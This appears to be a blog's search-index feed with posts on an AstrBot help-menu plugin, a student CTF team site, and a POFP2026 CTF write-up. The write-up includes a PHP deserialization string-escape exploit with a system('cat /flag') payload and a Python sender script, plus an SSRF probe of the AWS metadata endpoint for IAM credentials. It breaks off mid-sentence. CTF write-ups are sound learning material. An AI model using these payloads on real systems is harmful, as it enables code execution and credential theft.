<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>做了个帮助菜单插件</title>
      <link href="/posts/81f853a7/"/>
      <url>/posts/81f853a7/</url>
      
        <content type="html"><![CDATA[<p>还是喜欢图片帮助菜单，但是astrbot上面没有满意的，于是自己做了一个</p><div align="center"><p><img src="https://count.getloli.com/@astrbot_plugin_gyhelp?name=astrbot_plugin_gyhelp&theme=original-new&padding=7&offset=0&align=center&scale=1&pixelated=1&darkmode=auto" alt="astrbot_plugin_gyhelp"></p><h1 id="astrbot-plugin-gyhelp"><a href="#astrbot-plugin-gyhelp" class="headerlink" title="astrbot_plugin_gyhelp"></a>astrbot_plugin_gyhelp</h1><p><a href="https://www.gnu.org/licenses/agpl-3.0"><img src="https://img.shields.io/badge/License-AGPL%20v3-blue.svg" alt="License: AGPL v3"></a><br><a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-3.10%2B-blue.svg" alt="Python 3.10+"></a><br><a href="https://github.com/Soulter/AstrBot"><img src="https://img.shields.io/badge/AstrBot-4.0%2B-orange.svg" alt="AstrBot"></a><br><a href="https://github.com/Gong-Yie"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Gong_Yie-blue" alt="GitHub"></a></p></div><p>不再单纯发送枯燥的长文本帮助菜单，而是将所有已安装插件的指令自动读取、排版，并渲染成一张精美的<strong>图片</strong>发送给用户。支持自定义背景、字体、分页显示。</p><hr><h2 id="✨-核心特性"><a href="#✨-核心特性" class="headerlink" title="✨ 核心特性"></a>✨ 核心特性</h2><ul><li><strong>可视化渲染</strong>：将指令列表生成为图片，阅读体验更佳。</li><li><strong>智能分页</strong>：根据背景图片的高度和指令数量，自动计算每页显示的条目数。</li><li><strong>高度自定义</strong>：<ul><li>支持自定义<strong>背景图片</strong></li><li>支持自定义<strong>字体文件</strong>（打造个性化风格）。</li><li>支持自定义<strong>主标题</strong>和<strong>副标题</strong>。</li><li>支持自定义<strong>字体颜色</strong>和<strong>遮罩透明度</strong>。</li></ul></li><li><strong>系统指令管理</strong>：一键隐藏&#x2F;显示 AstrBot 自带的系统指令</li></ul><hr><h2 id="📥-安装方法"><a href="#📥-安装方法" class="headerlink" title="📥 安装方法"></a>📥 安装方法</h2><h3 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h3><ol><li><p>进入 AstrBot 的插件目录：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> data/plugins</span><br></pre></td></tr></table></figure></li><li><p>克隆本仓库（或将插件文件夹上传至此目录）：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> [https://github.com/Gong-Yie/astrbot_plugin_gyhelp.git](https://github.com/Gong-Yie/astrbot_plugin_gyhelp.git)</span><br></pre></td></tr></table></figure></li><li><p>安装依赖库（通常 AstrBot 环境已包含 PIL，若无请安装）：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure></li><li><p><strong>重启 AstrBot</strong>。</p></li></ol><hr><h2 id="📂-目录结构与资源放置"><a href="#📂-目录结构与资源放置" class="headerlink" title="📂 目录结构与资源放置"></a>📂 目录结构与资源放置</h2><p>插件启动后，会自动在 AstrBot 根目录的 <code>data</code> 文件夹下生成以下结构。<strong>请务必将您的自定义资源放入对应文件夹中</strong>：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AstrBot根目录/</span><br><span class="line">├── data/</span><br><span class="line">│   └── astrbot_plugin_gyhelp/       &lt;-- 插件数据主目录</span><br><span class="line">│       ├── background/              &lt;-- 【在此放入背景图片】(.jpg, .png)</span><br><span class="line">│       ├── font/                    &lt;-- 【在此放入字体文件】(.ttf, .ttc)</span><br><span class="line">│       ├── cache/                   &lt;-- 存放生成的帮助图缓存（可定期清理）</span><br><span class="line">│       └── config.json              &lt;-- 自动生成的配置文件（建议通过WebUI修改）</span><br></pre></td></tr></table></figure><h2 id="⚙️-配置说明-WebUI"><a href="#⚙️-配置说明-WebUI" class="headerlink" title="⚙️ 配置说明 (WebUI)"></a>⚙️ 配置说明 (WebUI)</h2><p>请在 AstrBot 管理面板 -&gt; <strong>插件</strong> -&gt; <strong>astrbot_plugin_gyhelp</strong> -&gt; <strong>配置</strong> 中进行设置。</p><table><thead><tr><th align="left">配置项</th><th align="left">类型</th><th align="left">默认值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>主标题文字</strong></td><td align="left">String</td><td align="left">AstrBot 指令菜单</td><td align="left">图片最上方显示的大标题。</td></tr><tr><td align="left"><strong>副标题文字</strong></td><td align="left">String</td><td align="left">(空)</td><td align="left">显示在标题下方的文字。留空则不占用空间。</td></tr><tr><td align="left"><strong>显示系统指令</strong></td><td align="left">Bool</td><td align="left">False</td><td align="left">是否显示 AstrBot 内置指令。默认关闭。</td></tr><tr><td align="left"><strong>背景图片文件名</strong></td><td align="left">String</td><td align="left">(空)</td><td align="left"><strong>重点</strong>：填写 <code>data/astrbot_plugin_gyhelp/background/</code> 下的文件名（包含后缀），例如 <code>bg.jpg</code>。留空则使用纯白背景。</td></tr><tr><td align="left"><strong>强制拉伸背景</strong></td><td align="left">Bool</td><td align="left">False</td><td align="left">开启后，图片将被强制拉伸至 1000x1400。关闭则使用图片原始尺寸作为画布。</td></tr><tr><td align="left"><strong>遮罩透明度</strong></td><td align="left">Int</td><td align="left">230</td><td align="left">范围 0-255。0为全透，255为纯白。用于在花哨背景上增加一层半透明蒙版，确保文字清晰可见。</td></tr><tr><td align="left"><strong>字体文件名</strong></td><td align="left">String</td><td align="left">(空)</td><td align="left"><strong>重点</strong>：填写 <code>data/astrbot_plugin_gyhelp/font/</code> 下的文件名，例如 <code>myfont.ttf</code>。留空则尝试使用系统字体。</td></tr><tr><td align="left"><strong>字体颜色</strong></td><td align="left">String</td><td align="left">#333333</td><td align="left">主标题和正文的颜色（Hex 格式）。</td></tr><tr><td align="left"><strong>排除插件名</strong></td><td align="left">List</td><td align="left">[]</td><td align="left">在此列表中填入的插件名（如 <code>astrbot_plugin_test</code>），其指令将不会显示。</td></tr></tbody></table><hr><h2 id="🎮-指令使用"><a href="#🎮-指令使用" class="headerlink" title="🎮 指令使用"></a>🎮 指令使用</h2><h3 id="1-查看帮助"><a href="#1-查看帮助" class="headerlink" title="1. 查看帮助"></a>1. 查看帮助</h3><ul><li><strong>指令</strong>：<code>/help</code></li><li><strong>作用</strong>：发送帮助菜单的第一页。</li><li><strong>翻页</strong>：<code>/help 2</code></li><li><strong>作用</strong>：查看第二页（如果有），以此类推。</li></ul><h3 id="2-快速切换模式"><a href="#2-快速切换模式" class="headerlink" title="2. 快速切换模式"></a>2. 快速切换模式</h3><ul><li><strong>指令</strong>：<code>/gyhelp_switch</code></li><li><strong>作用</strong>：快速开启或关闭“显示系统指令”功能（无需进入 WebUI）。</li></ul><hr><h2 id="⚠️-注意事项与常见问题-FAQ"><a href="#⚠️-注意事项与常见问题-FAQ" class="headerlink" title="⚠️ 注意事项与常见问题 (FAQ)"></a>⚠️ 注意事项与常见问题 (FAQ)</h2><h3 id="Q1-与内置的help指令冲突？"><a href="#Q1-与内置的help指令冲突？" class="headerlink" title="Q1: 与内置的help指令冲突？"></a>Q1: 与内置的<code>help</code>指令冲突？</h3><p>我不太喜欢astrbot内置的help指令，感觉又臭又长，所以禁用了astrbot自带的系统指令。</p><ul><li><strong>解决</strong>：<br>  禁用astrbot自带的系统指令。<br>  或者修改astrbot_plugin_gyhelp的help指令名称</li></ul><h3 id="Q2-背景图片或字体不生效？"><a href="#Q2-背景图片或字体不生效？" class="headerlink" title="Q2: 背景图片或字体不生效？"></a>Q2: 背景图片或字体不生效？</h3><ul><li><strong>解决</strong>：<ol><li>确保文件已放入 <code>data/astrbot_plugin_gyhelp/background/</code> 或 <code>font/</code> 目录。</li><li>确保 WebUI 配置中填写的文件名（包含后缀，如 <code>.jpg</code>）与实际文件名完全一致。</li><li>修改配置后，建议重新发送一次指令。</li></ol></li></ul><h3 id="Q3-图片里的文字被背景挡住了，看不清？"><a href="#Q3-图片里的文字被背景挡住了，看不清？" class="headerlink" title="Q3: 图片里的文字被背景挡住了，看不清？"></a>Q3: 图片里的文字被背景挡住了，看不清？</h3><ul><li><strong>解决</strong>：请在配置中调高 <code>overlay_opacity</code> (遮罩透明度) 的值（例如设为 240 或 250），或者更换一张颜色较浅的背景图。</li></ul><h3 id="Q4-如何修改图片生成的尺寸？"><a href="#Q4-如何修改图片生成的尺寸？" class="headerlink" title="Q4: 如何修改图片生成的尺寸？"></a>Q4: 如何修改图片生成的尺寸？</h3><ul><li><strong>解决</strong>：图片的尺寸由<strong>背景图片</strong>决定。<ul><li>如果您希望图片大一点，请找一张高分辨率的背景图，并关闭“强制拉伸”。</li><li>如果您开启“强制拉伸”，图片将固定为 1000x1400 像素。</li></ul></li></ul><hr><h2 id="📝-免责声明"><a href="#📝-免责声明" class="headerlink" title="📝 免责声明"></a>📝 免责声明</h2><ul><li><p>使用目的：本插件仅供学习交流，使用者不得用于非法或侵权行为，否则自行承担全部责任。</p></li><li><p>功能限制：本插件仅通过 onebot 协议获取公开信息，作者不对数据的准确性、完整性负责。</p></li><li><p>禁止非法修改：严禁私自魔改本插件（如接入社工库等违规操作），违者自行承担法律责任。</p></li><li><p>风险自担：使用者应自行评估使用风险，作者不对使用过程中产生的任何损失或风险承担责任。</p></li><li><p>法律适用：本声明适用中华人民共和国法律，争议由作者所在地法院管辖。</p></li><li><p>声明解释权：作者保留对本声明的最终解释权，并有权随时修改。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> GYBot制作计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建了404NFD战队官网</title>
      <link href="/posts/eabc6dd/"/>
      <url>/posts/eabc6dd/</url>
      
        <content type="html"><![CDATA[<p>是的没错，404NFD是咱校内的一支CTF战队。于是我搭建了<a href="https://404nfd-team.github.io/404NFD/">404NFD官网</a><br><img src="/postdata/%E6%90%AD%E5%BB%BA%E4%BA%86404NFD%E6%88%98%E9%98%9F%E5%AE%98%E7%BD%91/1.png" alt="图片"><br>目前有点潦草之后会慢慢改的<del>(不会咕咕咕)</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 404NFD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工伊3.0制作进度20260214</title>
      <link href="/posts/1e4b397f/"/>
      <url>/posts/1e4b397f/</url>
      
        <content type="html"><![CDATA[<p>本来还在看LangChain，想着怎么把agent和nonebot结合。<br>结果后来发现astrbot内置了agent。<br>于是nonebot添加agent的计划直接腰斩，我将使用更权威的astrbot。<br>工伊3.0以astrbot为框架。目前已添加点赞，表情包制作，盒等功能。<br>同时，聊天方面，添加了识图和语音合成大模型。<br>后续会写一个文档统一介绍一下。</p>]]></content>
      
      
      <categories>
          
          <category> GYBot制作计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POFP2026邀请赛WP(furryCTF 2025 高校联合新神赛 POFP出的题)</title>
      <link href="/posts/35249a4e/"/>
      <url>/posts/35249a4e/</url>
      
        <content type="html"><![CDATA[<p>太菜了，只做了部分Web和Misc题</p><h2 id="【Misc】AA哥的JAVA"><a href="#【Misc】AA哥的JAVA" class="headerlink" title="【Misc】AA哥的JAVA"></a>【Misc】AA哥的JAVA</h2><h3 id="【解题思路】"><a href="#【解题思路】" class="headerlink" title="【解题思路】"></a>【解题思路】</h3><p>一开始以为是修复Java文件，运行，就能输出flag，修复之后，输出的flag是错的。后来问了一下ai，原来是二进制解码，把Java文件中间的空格换成0，Tab换成1，然后二进制转字符，获得flag</p><h3 id="【解题步骤】"><a href="#【解题步骤】" class="headerlink" title="【解题步骤】"></a>【解题步骤】</h3><p><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/1.png" alt="1"><br>中间全是空格和Tab，自己一个一个复制粘贴太麻烦了，用ai帮忙写了一下脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def decode_whitespace(file_path):</span><br><span class="line">    try:</span><br><span class="line">        with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">            # 按行读取，保持行号信息方便调试</span><br><span class="line">            lines = f.readlines()</span><br><span class="line">    except FileNotFoundError:</span><br><span class="line">        print(f&quot;❌ 错误: 找不到文件 &#123;file_path&#125;&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 正则：匹配 前后都有非空白字符 的中间空白区域</span><br><span class="line">    # 这样可以避开 行首缩进 和 行尾换行符</span><br><span class="line">    regex_pattern = re.compile(r&#x27;(?&lt;=\S)([ \t]+)(?=\S)&#x27;)</span><br><span class="line"></span><br><span class="line">    decoded_chars = []</span><br><span class="line">    </span><br><span class="line">    print(f&quot;[*] 正在分析文件: &#123;file_path&#125; (共 &#123;len(lines)&#125; 行)&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line"></span><br><span class="line">    for line_num, line in enumerate(lines, 1):</span><br><span class="line">        # 查找当前行是否有符合条件的“中间空白”</span><br><span class="line">        matches = regex_pattern.findall(line)</span><br><span class="line"></span><br><span class="line">        for gap in matches:</span><br><span class="line">            # 过滤策略：忽略正常的单个空格（Java代码中单词间的正常分隔）</span><br><span class="line">            if len(gap) == 1 and gap == &#x27; &#x27;:</span><br><span class="line">                continue</span><br><span class="line">            </span><br><span class="line">            # 转换逻辑：Tab -&gt; 1, Space -&gt; 0</span><br><span class="line">            # 提示：如果解出来乱码，尝试互换 &#x27;1&#x27; 和 &#x27;0&#x27;</span><br><span class="line">            chunk_bin = &quot;&quot;</span><br><span class="line">            for char in gap:</span><br><span class="line">                if char == &#x27;\t&#x27;:</span><br><span class="line">                    chunk_bin += &#x27;1&#x27;</span><br><span class="line">                elif char == &#x27; &#x27;:</span><br><span class="line">                    chunk_bin += &#x27;0&#x27;</span><br><span class="line">            </span><br><span class="line">            # 将二进制转换为字符</span><br><span class="line">            if chunk_bin:</span><br><span class="line">                try:</span><br><span class="line">                    char_code = int(chunk_bin, 2)</span><br><span class="line">                    decoded_char = chr(char_code)</span><br><span class="line">                    decoded_chars.append(decoded_char)</span><br><span class="line">                    </span><br><span class="line">                    # 调试：可以看到每一行解出了什么</span><br><span class="line">                    # print(f&quot;行 &#123;line_num&#125;: &#123;chunk_bin&#125; -&gt; &#123;decoded_char&#125; (&#123;char_code&#125;)&quot;)</span><br><span class="line">                    </span><br><span class="line">                except ValueError:</span><br><span class="line">                    print(f&quot;[!] 行 &#123;line_num&#125; 转换失败: &#123;chunk_bin&#125;&quot;)</span><br><span class="line">                    decoded_chars.append(&quot;?&quot;)</span><br><span class="line"></span><br><span class="line">    final_flag = &quot;&quot;.join(decoded_chars)</span><br><span class="line"></span><br><span class="line">    print(f&quot;[*] 提取完成，共找到 &#123;len(decoded_chars)&#125; 个隐藏字符&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line">    print(f&quot;🚩 解码结果 (Flag): \n&#123;final_flag&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    filename = &quot;AA.java&quot;</span><br><span class="line">    if len(sys.argv) &gt; 1:</span><br><span class="line">        filename = sys.argv[1]</span><br><span class="line">    </span><br><span class="line">    decode_whitespace(filename)</span><br></pre></td></tr></table></figure><p>获得flag<br><code>pofp{HuAm1_tru1y_c4nn0t_m4ke_sense_0f_J4v4}</code></p><h2 id="【Forensics】谁动了我的钱包"><a href="#【Forensics】谁动了我的钱包" class="headerlink" title="【Forensics】谁动了我的钱包"></a>【Forensics】谁动了我的钱包</h2><h3 id="【解题思路】-1"><a href="#【解题思路】-1" class="headerlink" title="【解题思路】"></a>【解题思路】</h3><p>跟着out一路找，最后的账户肯定都是in</p><h3 id="【解题步骤】-1"><a href="#【解题步骤】-1" class="headerlink" title="【解题步骤】"></a>【解题步骤】</h3><ol><li>先进<code>0x3Cbf1FA1EB6b76e520a67699dFebfaf7Ca33b13E</code></li><li>再进<code>0x0Ce829352d1Cf6e3dbBef7b31aA43a8467D98dEA</code></li><li>再进<code>0x536a92088eB6c486440A77AAa81e5C7C59334903</code></li><li>再进<code>0x529F3E609d09dF558A598785f421867447113C2b</code></li><li>再进<code>0x3D89ce589dD293b4d00F3368b54F6f26D851Bd81</code></li><li>再进<code>0xFF7C350e70879D04A13bb2d8D77B60e603b7DB72</code><br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/2.png" alt="2"><br>flag就是<code>POFP{0xFF7C350e70879D04A13bb2d8D77B60e603b7DB72}</code></li></ol><h2 id="【Web】babypop"><a href="#【Web】babypop" class="headerlink" title="【Web】babypop"></a>【Web】babypop</h2><h3 id="【解题思路】-2"><a href="#【解题思路】-2" class="headerlink" title="【解题思路】"></a>【解题思路】</h3><p>我们要从反序列化点<code>unserialize($safe_data)</code>开始，构造一条通往<code>eval</code>的路径：<br>起点：<code>LogService</code>类的<code>__destruct()</code>方法。当对象销毁时，它会检查<code>$this-&gt;handler</code>是否有<code>close</code>方法。<br>跳板： 将<code>LogService</code>的<code>$this-&gt;handler</code>设置为<code>FileStream</code>对象。<br>终点：<code>FileStream</code>的<code>close()</code>方法。如果<code>$this-&gt;mode === &#39;debug&#39;</code>，它就会执行<code>eval($this-&gt;content)</code>。<br>POP 链路径：<br><code>LogService::__destruct() -&gt; FileStream::close() -&gt; eval()</code><br>代码中存在一个关键的“清理”函数：<code>str_replace(&quot;hacker&quot;, &quot;&quot;, $input);</code><br>这会导致序列化后的字符串长度发生变化。由于<code>hacker</code>（6个字符）被替换为空（0个字符），序列化字符串中的长度标识（L）会大于实际字符长度。这使得我们可以利用“空位”来吞掉原本的序列化数据，并伪造我们自己的对象。<br>【解题步骤】<br>先构造一个满足<code>eval</code>条件的<code>LogService</code>序列化串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$mode</span> = <span class="string">&quot;debug&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">FileStream</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="keyword">new</span> <span class="title class_">LogService</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$target</span>);</span><br></pre></td></tr></table></figure><p>生成<code>O:10:&quot;LogService&quot;:1:{s:10:&quot;*handler&quot;;O:10:&quot;FileStream&quot;:3:{s:16:&quot;FileStreampath&quot;;s:1:&quot;1&quot;;s:16:&quot;FileStreammode&quot;;s:5:&quot;debug&quot;;s:7:&quot;content&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;}}</code><br>由于<code>protected</code>和<code>private</code>属性会有不可见字符<code>%00</code>，实际编写时需处理<br>接着我们要让<code>username</code>属性吞掉后面的内容。<br>通过<code>user</code>输入大量的<code>hacker</code>。每个<code>hacker</code>消失，会多出 6 个字符的控制权。<br>由于手动操作误差较大，我们使用ai生成一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 配置目标 URL</span></span><br><span class="line">target_url = <span class="string">&quot;http://ctf.furryctf.com:36555/&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造嵌套的恶意对象序列化字符串</span></span><br><span class="line"><span class="comment"># 使用 S 标识符配合 \00 代替不可见字符，防止传输丢失</span></span><br><span class="line"><span class="comment"># 逻辑：LogService -&gt; handler (FileStream) -&gt; close() -&gt; eval</span></span><br><span class="line">payload_obj = (</span><br><span class="line">    <span class="string">&#x27;O:10:&quot;LogService&quot;:1:&#123;S:10:&quot;\\00*\\00handler&quot;;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;O:10:&quot;FileStream&quot;:3:&#123;S:16:&quot;\\00FileStream\\00path&quot;;s:1:&quot;1&quot;;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;S:16:&quot;\\00FileStream\\00mode&quot;;s:5:&quot;debug&quot;;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;s:7:&quot;content&quot;;s:20:&quot;system(\&#x27;cat /flag\&#x27;);&quot;;&#125;&#125;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 构造 Bio 部分</span></span><br><span class="line"><span class="comment"># 我们需要闭合 username 的引号，并注入 preference 属性</span></span><br><span class="line"><span class="comment"># &quot;;s:3:&quot;bio&quot;;s:1:&quot;a&quot;;s:10:&quot;preference&quot;;[PAYLOAD]&#125;</span></span><br><span class="line">bio_injection = <span class="string">&#x27;&quot;;s:3:&quot;bio&quot;;s:1:&quot;a&quot;;s:10:&quot;preference&quot;;&#x27;</span> + payload_obj + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 计算逃逸长度</span></span><br><span class="line"><span class="comment"># 序列化后的结构是 s:L:&quot;[username]&quot;;s:3:&quot;bio&quot;;s:M:&quot;[bio内容]&quot;</span></span><br><span class="line"><span class="comment"># 我们要吞掉的部分是从 username 的结尾引号开始，到 bio 内容的开头引号：</span></span><br><span class="line"><span class="comment"># 也就是这个字符串： &quot;;s:3:&quot;bio&quot;;s:长度:&quot;</span></span><br><span class="line"><span class="comment"># 这里的“长度”取决于 bio_injection 的总字节数</span></span><br><span class="line"></span><br><span class="line">bio_len = <span class="built_in">len</span>(bio_injection)</span><br><span class="line"><span class="comment"># 构造被吞噬的中间件结构 (假设 bio 长度是 3 位数，如 245)</span></span><br><span class="line">padding_str = <span class="string">f&#x27;&quot;;s:3:&quot;bio&quot;;s:<span class="subst">&#123;bio_len&#125;</span>:&quot;&#x27;</span> </span><br><span class="line">target_swallow_len = <span class="built_in">len</span>(padding_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找 6 的倍数进行对齐</span></span><br><span class="line"><span class="comment"># 如果 target_swallow_len 不是 6 的倍数，我们在 bio 前面补空格</span></span><br><span class="line">needed_padding = (<span class="number">6</span> - (target_swallow_len % <span class="number">6</span>)) % <span class="number">6</span></span><br><span class="line">final_bio = (<span class="string">&quot; &quot;</span> * needed_padding) + bio_injection</span><br><span class="line">final_swallow_len = target_swallow_len + needed_padding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 计算需要多少个 hacker</span></span><br><span class="line">hacker_count = final_swallow_len // <span class="number">6</span></span><br><span class="line">final_user = <span class="string">&quot;hacker&quot;</span> * hacker_count</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 发送攻击请求</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: final_user,</span><br><span class="line">    <span class="string">&quot;bio&quot;</span>: final_bio</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 正在尝试逃逸...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 吞噬长度: <span class="subst">&#123;final_swallow_len&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Hacker 数量: <span class="subst">&#123;hacker_count&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 发送 Bio Payload: <span class="subst">&#123;final_bio[:<span class="number">50</span>]&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.post(target_url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 响应内容：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] 请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>获得flag<br><code>POFP{6b2bb1ee-2e0f-42b4-9dad-2ae0991c00bc}</code></p><h2 id="【Web】CCPreview"><a href="#【Web】CCPreview" class="headerlink" title="【Web】CCPreview"></a>【Web】CCPreview</h2><h3 id="【解题思路】-3"><a href="#【解题思路】-3" class="headerlink" title="【解题思路】"></a>【解题思路】</h3><p>AWS EC2 实例有一个特殊的链路本地地址<code>169.254.169.254</code>，用于提供实例的元数据（Metadata）。如果在 EC2 实例上运行的 Web 服务存在 SSRF 漏洞（即允许用户控制服务器发出的 HTTP 请求），攻击者就可以访问这个地址来获取敏感信息。</p><h3 id="【解题步骤】-2"><a href="#【解题步骤】-2" class="headerlink" title="【解题步骤】"></a>【解题步骤】</h3><p>尝试<code>http://169.254.169.254/latest/meta-data/</code><br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/3.png" alt="3"><br>发现<code>/iam</code>,需要通过获取 IAM 临时凭证来访问 AWS 资源（通常是 